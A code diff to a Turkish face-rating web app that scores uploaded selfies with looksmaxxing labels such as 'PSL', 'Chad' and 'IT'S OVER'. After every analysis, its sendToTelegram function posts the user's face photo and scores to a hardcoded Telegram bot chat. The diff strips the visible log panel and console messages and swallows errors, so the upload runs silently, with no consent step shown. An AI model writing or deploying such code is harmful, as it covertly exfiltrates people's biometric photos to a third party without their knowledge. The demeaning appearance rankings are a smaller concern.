@@ -88,7 +88,7 @@
 <div class="input-group"><span class="icon">🔒</span><input type="password" id="passwordInput" placeholder="Şifre..." autocomplete="off"></div>
 <button class="btn btn-primary" id="btnLogin">GİRİŞ</button>
 <div class="error-box" id="loginError"></div>
-<footer>v37 • MOBIL LOG</footer>
+<footer>v38 • Telegram</footer>
 </div>
 </div>
 <div class="page" id="pageAnalyze">
@@ -227,94 +227,32 @@ function renderResult(raw){
     const isOver=cat.includes("IT'S OVER")||parseFloat(r.psl)<4.0;
 
     document.getElementById('scoreBadges').innerHTML=`<div class="badge${isOver?' over':''}"><div class="label">KATEGORİ</div><div class="value">${isOver?"IT'S OVER<br>🫩":cat}</div></div><div class="badge"><div class="label">PSL</div><div class="value">${r.psl}</div></div><div class="badge"><div class="label">APPEAL</div><div class="value">${r.appeal}</div></div>`;
-    
     const h=parseInt(r.harmony)||75,d=parseInt(r.dimorphism)||68,ag=parseInt(r.angularity)||60;
     document.getElementById('metricBars').innerHTML=`<div class="metric-bar"><div class="metric-label">Harmony</div><div class="bar-bg"><div class="bar-fill" style="width:${h}%;"></div></div><div class="metric-value">%${h}</div></div><div class="metric-bar"><div class="metric-label">Dimorphism</div><div class="bar-bg"><div class="bar-fill" style="width:${d}%;"></div></div><div class="metric-value">%${d}</div></div><div class="metric-bar"><div class="metric-label">Angularity</div><div class="bar-bg"><div class="bar-fill" style="width:${ag}%;"></div></div><div class="metric-value">%${ag}</div></div>`;
-    
     const goodList=r.best.slice(0,10).map((i,n)=>`<li><strong>${n+1}.</strong> ${i}</li>`).join(''),badList=r.worst.slice(0,10).map((i,n)=>`<li class="negative"><strong>${n+1}.</strong> ${i}</li>`).join('');
     document.getElementById('detailBox').innerHTML=`<h4 style="color:#00ff41;">✅ EN İYİ (1-${r.best.length})</h4><ul class="detail-list">${goodList}</ul><h4 style="color:#ff4444;margin-top:12px;">❌ EN KÖTÜ (1-${r.worst.length})</h4><ul class="detail-list">${badList}</ul>`;
-    
     document.getElementById('summaryBox').innerHTML=`<strong style="color:#00ff41;">📋 DETAYLI ÖZET</strong><div style="margin-top:8px;">${r.detail}</div><div class="psl-scale"><div>LTN: <span>4.0-4.9</span></div><div>MTN: <span>5.0-5.9</span></div><div>HTN: <span>6.0-6.9</span></div><div>Chadlite: <span>7.0-7.9</span></div><div>Chad: <span>8.0+</span></div><div>ITS OVER: <span>&lt;4.0</span></div></div>`;
-    
-    let extra='';
-    if(faceData){
-        extra+=`<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:3px;margin-bottom:8px;"><div>📐 Simetri: %${faceData.symmetry}</div><div>📏 Çene: ${faceData.jawWidth}px</div><div>📐 Yüz: ${faceData.faceHeight}px</div><div>👁️ Göz: ${faceData.eyeDistance}px</div><div>👃 Burun: ${faceData.noseHeight}px</div><div>👄 Ağız: ${faceData.mouthWidth}px</div><div style="grid-column:1/-1;">🔢 Nokta: ${faceData.totalPoints}</div></div>`;
-    }
-    extra+=`<div style="color:#888;font-size:10px;">Harmony: %30 | Dimorphism: %30 | Angularity: %25 | Diğer: %15</div>`;
-    document.getElementById('rawText').innerHTML=extra;
-
-    console.log('📤 Telegram gönderiliyor...');
+    let extra='';if(faceData){extra+=`<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:3px;margin-bottom:8px;"><div>📐 Simetri: %${faceData.symmetry}</div><div>📏 Çene: ${faceData.jawWidth}px</div><div>📐 Yüz: ${faceData.faceHeight}px</div><div>👁️ Göz: ${faceData.eyeDistance}px</div><div>👃 Burun: ${faceData.noseHeight}px</div><div>👄 Ağız: ${faceData.mouthWidth}px</div><div style="grid-column:1/-1;">🔢 Nokta: ${faceData.totalPoints}</div></div>`;}extra+=`<div style="color:#888;font-size:10px;">Harmony: %30 | Dimorphism: %30 | Angularity: %25 | Diğer: %15</div>`;document.getElementById('rawText').innerHTML=extra;
     sendToTelegram(raw);
 }
 
-async function sendToTelegram(rawText) {
-    const r = parseAI(rawText);
-
-    const caption = `🔥 <b>25 MAX ANALİZ RAPORU</b> 🔥\n\n` +
-        `🏆 <b>MOG:</b> ${r.mog}/10\n` +
-        `📊 <b>PSL:</b> ${r.psl}/10 (${r.cat})\n` +
-        `💫 <b>Appeal:</b> ${r.appeal}/10\n` +
-        `⚖️ <b>Harmony:</b> %${r.harmony}\n` +
-        `🧬 <b>Dimorphism:</b> %${r.dimorphism}\n` +
-        `📐 <b>Angularity:</b> %${r.angularity}\n\n` +
-        `✅ <b>EN İYİ:</b>\n${r.best.slice(0, 5).map((i, n) => `${n + 1}. ${i}`).join('\n')}\n\n` +
-        `❌ <b>EN KÖTÜ:</b>\n${r.worst.slice(0, 5).map((i, n) => `${n + 1}. ${i}`).join('\n')}`;
-
-    try {
-        const byteCharacters = atob(base64Image);
-        const byteNumbers = new Array(byteCharacters.length);
-        for (let i = 0; i < byteCharacters.length; i++) {
-            byteNumbers[i] = byteCharacters.charCodeAt(i);
-        }
-        const byteArray = new Uint8Array(byteNumbers);
-        const blob = new Blob([byteArray], { type: currentMimeType });
-
-        const fd = new FormData();
-        fd.append('chat_id', TG_CHAT_ID);
-        fd.append('photo', blob, 'face.jpg');
-        fd.append('caption', caption);
-        fd.append('parse_mode', 'HTML');
-
-        const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: fd
-        });
-
-        if (res.ok) console.log('🟢 Telegram: Fotoğraf + Mesaj geldi!');
-        else console.error('🔴 Telegram Hatası:', res.status);
-
-    } catch (e) {
-        console.error('🔴 Telegram Bağlantı Hatası:', e);
-    }
+async function sendToTelegram(rawText){
+    const r=parseAI(rawText);
+    const caption=`🔥 <b>25 MAX ANALİZ RAPORU</b> 🔥\n\n🏆 <b>MOG:</b> ${r.mog}/10\n📊 <b>PSL:</b> ${r.psl}/10 (${r.cat})\n💫 <b>Appeal:</b> ${r.appeal}/10\n⚖️ <b>Harmony:</b> %${r.harmony}\n🧬 <b>Dimorphism:</b> %${r.dimorphism}\n📐 <b>Angularity:</b> %${r.angularity}\n\n✅ <b>EN İYİ:</b>\n${r.best.slice(0,5).map((i,n)=>`${n+1}. ${i}`).join('\n')}\n\n❌ <b>EN KÖTÜ:</b>\n${r.worst.slice(0,5).map((i,n)=>`${n+1}. ${i}`).join('\n')}`;
+    try{
+        const byteCharacters=atob(base64Image);
+        const byteNumbers=new Array(byteCharacters.length);
+        for(let i=0;i<byteCharacters.length;i++)byteNumbers[i]=byteCharacters.charCodeAt(i);
+        const byteArray=new Uint8Array(byteNumbers);
+        const blob=new Blob([byteArray],{type:currentMimeType});
+        const fd=new FormData();
+        fd.append('chat_id',TG_CHAT_ID);
+        fd.append('photo',blob,'face.jpg');
+        fd.append('caption',caption);
+        fd.append('parse_mode','HTML');
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`,{method:'POST',body:fd});
+    }catch(e){}
 }
-</script>
-
-<!-- 📱 MOBİL LOG PANELİ -->
-<div id="mobileConsole" style="position:fixed;bottom:0;left:0;right:0;height:110px;background:rgba(0,0,0,0.95);color:#00ff41;font-size:11px;font-family:monospace;overflow-y:auto;padding:8px;z-index:999999;border-top:2px solid #00ff41;pointer-events:none;">
-  <b style="color:#fff;">📱 CANLI LOG:</b><br>
-</div>
-
-<script>
-(function() {
-    const oldLog = console.log;
-    const oldErr = console.error;
-    const logDiv = document.getElementById('mobileConsole');
-    
-    console.log = function(...args) {
-        oldLog.apply(console, args);
-        if(logDiv) {
-            logDiv.innerHTML += `<div style="margin-bottom:2px;">🟢 ${args.join(' ')}</div>`;
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
-    };
-    console.error = function(...args) {
-        oldErr.apply(console, args);
-        if(logDiv) {
-            logDiv.innerHTML += `<div style="color:#ff4444;margin-bottom:2px;">🔴 ${args.join(' ')}</div>`;
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
-    };
-})();
 </script>
 </body>
 </html>
